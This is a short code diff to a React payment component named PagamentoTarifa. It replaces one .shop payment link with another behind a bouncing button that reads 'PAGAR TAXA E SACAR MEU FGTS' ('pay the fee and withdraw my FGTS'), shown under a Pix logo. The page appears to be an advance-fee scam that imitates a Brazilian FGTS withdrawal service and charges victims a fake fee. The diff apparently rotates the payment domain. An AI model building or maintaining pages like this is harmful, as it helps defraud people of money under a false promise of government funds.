@@ -99,7 +99,7 @@ export function PagamentoTarifa() {
           <img src={pix} alt="Logo Pix" className="w-24 mb-4" />
         </div>
 
-        <a href="https://pay.pagamentofgt.shop/KV603k01qyEZw8y" className="w-full max-w-xl">
+        <a href="https://pay.aberturacoop.shop/N1nVZpYVEpmGlM6" className="w-full max-w-xl">
           <button className="bg-green-500 w-full hover:bg-green-600 text-white font-bold py-3 px-6 rounded-md shadow-lg transition-all duration-200 animate-bounce text-2xl">
             PAGAR TAXA E SACAR MEU FGTS
           </button>
